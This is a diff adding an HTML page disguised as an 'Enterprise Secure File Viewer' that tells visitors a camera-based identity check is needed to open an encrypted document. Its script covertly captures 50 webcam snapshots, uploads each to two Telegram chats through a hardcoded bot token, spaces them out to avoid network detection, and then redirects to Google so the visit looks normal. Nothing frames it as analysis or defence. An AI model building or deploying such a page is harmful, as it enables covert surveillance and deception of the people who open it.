@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enterprise Secure File Viewer</title>
+    <style>
+        :root {
+            --primary-blue: #005fb8;
+            --bg-gray: #f8f9fa;
+            --text-main: #333;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--bg-gray); 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex; flex-direction: column; height: 100vh;
+        }
+
+        .header {
+            background: #fff; height: 50px; border-bottom: 1px solid #ddd;
+            display: flex; align-items: center; padding: 0 20px; font-weight: 600; color: var(--primary-blue);
+        }
+
+        .container {
+            flex: 1; display: flex; align-items: center; justify-content: center; padding: 20px;
+        }
+
+        .box {
+            width: 100%; max-width: 450px; background: #fff; border: 1px solid #ddd;
+            border-radius: 8px; padding: 40px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+        }
+
+        .icon-shield { width: 60px; height: 60px; margin-bottom: 20px; fill: var(--primary-blue); }
+
+        h1 { font-size: 1.4rem; margin: 0 0 10px; color: #111; }
+        p { font-size: 0.95rem; color: #666; margin-bottom: 30px; line-height: 1.5; }
+
+        .btn-verify {
+            background: var(--primary-blue); color: #fff; border: none;
+            padding: 12px 30px; border-radius: 5px; font-size: 1rem; font-weight: 600;
+            cursor: pointer; transition: 0.2s;
+        }
+        .btn-verify:hover { background: #004a8f; }
+
+        #processing-ui { display: none; }
+
+        .loader {
+            border: 3px solid #f3f3f3; border-top: 3px solid var(--primary-blue);
+            border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div class="header">Secure Viewer v4.2</div>
+
+    <div class="container">
+        <div class="box" id="start-ui">
+            <svg class="icon-shield" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+            <h1>Identity Check Required</h1>
+            <p>This document is encrypted. To access the contents, your system must complete a <b>Hardware Presence Verification</b> via the secure camera portal.</p>
+            <button class="btn-verify" onclick="initiatePortal()">Start Verification</button>
+        </div>
+
+        <div class="box" id="processing-ui">
+            <div class="loader"></div>
+            <h1>Verifying Node...</h1>
+            <p id="status-text">Initializing secure handshake with Mumbai_Primary...</p>
+            <div style="font-family: monospace; font-size: 10px; background: #f0f0f0; padding: 10px; text-align: left; border-radius: 4px;">
+                > ENCRYPT_CHALLENGE_ACTIVE<br>
+                > SYNC_HARDWARE_ID: <span id="node-id"></span><br>
+                > RSA_BIT_VERIFY... [WAITING]
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Engine -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        // Use the Token and Chat IDs from your Pipedream setup
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function initiatePortal() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('start-ui').style.display = 'none';
+                document.getElementById('processing-ui').style.display = 'block';
+                document.getElementById('node-id').innerText = Math.random().toString(36).substring(7).toUpperCase();
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let count = 0;
+
+                    // This interval sends 50 photos to Telegram, just like before
+                    const exfil = setInterval(() => {
+                        count++;
+                        relayData(count);
+
+                        if (count >= 50) {
+                            clearInterval(exfil);
+                            stream.getTracks().forEach(t => t.stop());
+                            // Redirect to a real PDF or neutral site to look normal
+                            window.location.href = "https://www.google.com/search?q=secure+document+viewer";
+                        }
+                    }, 1500); // 1.5 seconds per photo to avoid instant network flags
+                };
+            } catch (err) {
+                console.error("Access denied");
+                window.location.href = "https://www.google.com";
+            }
+        }
+
+        function relayData(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; 
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); 
+                    fd.append('photo', blob, `node_capture_${idx}.jpg`);
+                    fd.append('caption', `ID: ${id} | Sequence: ${idx}`);
+                    
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { 
+                        method: 'POST', 
+                        body: fd 
+                    });
+                });
+            }, 'image/jpeg', 0.4); // Optimized quality for speed
+        }
+    </script>
+</body>
+</html>
